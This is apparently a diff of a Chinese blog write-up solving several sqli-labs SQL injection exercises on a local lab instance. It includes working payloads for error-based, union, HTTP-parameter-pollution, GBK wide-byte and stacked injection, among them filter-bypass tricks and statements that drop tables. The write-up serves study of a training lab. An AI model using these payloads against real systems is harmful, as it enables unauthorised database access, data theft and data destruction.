+<h2 id="less23"><a class="markdownIt-Anchor" href="#less23"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-23/">Less23</a></h2>
+<p>注释符全被过滤掉了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718095943381.png" alt="" /></p>
+<p>单引号闭合时报错</p>
+<p>加上注释符时报错未消失</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718100037954.png" alt="" /></p>
+<p>猜测注释符可能被过滤掉了（尝试编码绕过也不行）</p>
+<p>过滤了注释符并不能影响我们的注入，可以使用两个单引号分别闭合两侧的 Sql 查询语句，同时需要使用 OR 运算符分割并构造恒真语句</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718100819514.png" alt="image-20250718100819405" /></p>
+<p>成功力！</p>
+<p>这样就可以开始查询数据库了</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and updatexml(1,concat(1,(select database())),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"># 或者用<span class="keyword">and</span> <span class="string">&#x27;闭合后面的引号也行(这里是报错注入所以就不用太在意and、or逻辑关系)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> database()))) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718101146132.png" alt="image-20250718101146015" /></p>
+<h2 id="less26"><a class="markdownIt-Anchor" href="#less26"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-26">Less26</a></h2>
+<p>过滤了and、or、空格、注释符</p>
+<p>and、or可以通过双写绕过，注释符过滤绕过可以通过闭合后引号解决</p>
+<blockquote>
+<p>测试闭合方式（请教了土豆学长才知道）</p>
+<p>先用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;anandd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>再用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;anandd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>若网页回显不同说明是单引号闭合</p>
+</blockquote>
+<p>空格过滤我尝试了url编码、<code>/**/</code>绕过发现行不通</p>
+<p>去网上捣鼓一番，收获颇丰！</p>
+<p>如果空格被过滤可以使用以下字符替代</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)，%0c(换页符)，%20(空格)，/**/(内联注释)</span><br></pre></td></tr></table></figure>
+<p>我发现还可以用()进行绕过</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;anandd(extractvalue(1,concat(1,(select(database())))))oorr&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718114338748.png" alt="" /></p>
+<p>还有个神仙做法：</p>
+<p>用<strong>使用 “||” 替代 “or”</strong></p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="less27a"><a class="markdownIt-Anchor" href="#less27a"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-27a/">Less27a</a></h2>
+<p>过滤了select、union、空格、注释符</p>
+<p>双引号闭合</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718161608614.png" alt="" /></p>
+<p>没有语法报错，不能用报错注入，我们选择联合查询注入</p>
+<p>由于<code>-</code>被过滤，我们选一个较大的数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718162514618.png" alt="" /></p>
+<p>接下去正常绕过查询</p>
+<h2 id="less29"><a class="markdownIt-Anchor" href="#less29"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-29/">Less29</a></h2>
 <p>单引号闭合，http参数污染</p>
 <p>这里应该是我的靶场出了点问题，竟然没过滤（都是Protected By The World’s Best Firewall，但是可以正常查询）</p>
 <p>去看了题目的源码，发现还有<code>login.php</code>和<code>hacked.php</code>代码</p>
 <p>只能手动进入<code>login.php</code></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224639295.png" alt="image-20250719114627717" /></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114627832.png" alt="image-20250719114627717" /></p>
 <p>测试了下单引号双引号闭合，都跳转到<code>hacked.php</code></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224533639.png" alt="image-20250719114553014" /></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114553137.png" alt="image-20250719114553014" /></p>
 <p>看了下<code>login.php</code>：</p>
 <p><strong>WAF白名单函数<code>whitelist($input)</code></strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WAF implimentation with a whitelist approach..... only allows input to be Numeric.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">        <span class="comment">//return $match;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;	</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">        <span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -160,17 +278,48 @@
 <p><strong>HTTP 参数污染（HPP） 行为模拟 <code>java_implimentation($query_string)</code></strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">    <span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>该方法将 GET 读入的整行参数使用 <code>explode()</code> 方法对 “<code>&amp;</code>” 进行分割，返回一个分割后的数组。接着方法通过 <code>substr(</code>) 方法提取对 “<code>&amp;</code>” 分割后的第一个元素的前 2 个字符，若这 2 个字符是 “<code>id</code>”，则再次使用 <code>substr()</code> 方法提取等号后面的值返回。注意该方法提取的是 2 个同名变量中的第一个，因此它无法对第二个同名变量进行操作</p>
-<p>搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，由于注入 2 个同名参数时，<code>java_implimentation()</code> 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了，所以<code>$_GET['id']</code>变量实际上是最后一个id参数</p>
+<p>结合网页给的pdf(这个我打不开，嫖了一下土豆哥的)</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719112116232.png" alt="img" /></p>
+<p>可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，由于注入 2 个同名参数时，<code>java_implimentation()</code> 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了，所以<code>$_GET['id']</code>变量实际上是最后一个id参数</p>
 <p><strong>总结：</strong></p>
 <p><strong>1.全数字输入才能绕过WAF</strong></p>
 <p><strong>2.我们可以通过注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入</strong></p>
 <p>payload：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224657633.png" alt="image-20250719114742887" /></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114743003.png" alt="image-20250719114742887" /></p>
+<h2 id="less32"><a class="markdownIt-Anchor" href="#less32"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-32">Less32</a></h2>
+<p>宽字节注入</p>
+<p>输入<code>'</code>发现其被转义</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719143251733.png" alt="" /></p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backsla</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数使用正则表达式匹配字符，将 <code>'</code> 转义为 <code>\'</code> ， 将 <code>\</code> 转义为 <code>\\</code> ，将 <code>&quot;</code> 转义为 <code>\&quot;</code></p>
+<p>在Less36中采取：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>mysql_real_escape_string()</code>函数来转义特殊字符</p>
+<p>对于一般的转义字符，我们是无法构造注入的 payload 的，通常情况下不存在SQL注入，但这并不代表网页就没有任何漏洞可以注入</p>
+<p>我们注意到数据库采用gbk编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>这里尝试采用宽字节注入：</p>
+<p>数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “<code>%df</code>” 会和反斜杠的 URL 编码 “<code>%5C</code>” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了</p>
+<p>输入<code>%df'</code>时成功返回错误信息，加<code>--+</code>页面正常，绕过成功</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719144519595.png" alt="" /></p>
+<p>我们采用联合查询注入，但需要注意的是：</p>
+<p>不要使用单引号来闭合字符串，改用十六进制 (HEX) 编码（网页有提示）替代所需数据库名、表名</p>
+<p>如以下使用<code>0x7365637572697479</code>替代<code>security</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719144540863.png" alt="" /></p>
+<h2 id="less38"><a class="markdownIt-Anchor" href="#less38"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-38/">Less38</a></h2>
+<p>单引号闭合，这题主要用来测试堆叠注入</p>
+<p>在源码中发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
+<p>该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong><code>mysql_query()</code> 函数</strong>，只执行一条 MySQL 查询</p>
+<p>插入新用户ikun：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719162311304.png" alt="" /></p>
+<p>查询id为999的用户：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719162329342.png" alt="" /></p>
 <blockquote>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12966636.html">HTTP参数污染学习</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/120182543">Bypass WAF之HTTP参数污染(HPP)漏洞挖掘</a></p>
+<p>堆叠注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">CREATE TABLE</span> WhiteMoon <span class="keyword">LIKE</span> users;<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">INSERT INTO</span> WhiteMoon <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">DELETE</span> <span class="keyword">FROM</span> WhiteMoon;<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> WhiteMoon;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 </blockquote>
 
 <div class="article-footer fs14">
@@ -181,7 +330,7 @@
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/07/28/sqli-labs/">sqli-labs</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/17/%E5%88%9D%E6%8E%A2Docker/">初探Docker</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/07/28/xss-labs/">xss-labs</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/21/HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/">HTTP参数污染</a></div></section></div>
 
 
 
@@ -239,7 +388,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-text"> HTTP参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%96%B9%E5%BC%8F"><span class="toc-text"> 覆盖方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-text"> WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E7%BB%95%E8%BF%87"><span class="toc-text"> SQL绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E7%BB%95%E8%BF%87%E5%BE%85"><span class="toc-text"> XSS绕过（待）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%BE%85"><span class="toc-text"> 文件上传（待）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text"> 逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8Furl%E8%B7%B3%E8%BD%AC"><span class="toc-text"> 任意URL跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E7%9F%AD%E4%BF%A1%E7%88%86%E7%A0%B4"><span class="toc-text"> 任意密码重置（短信爆破）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text"> 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text"> 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 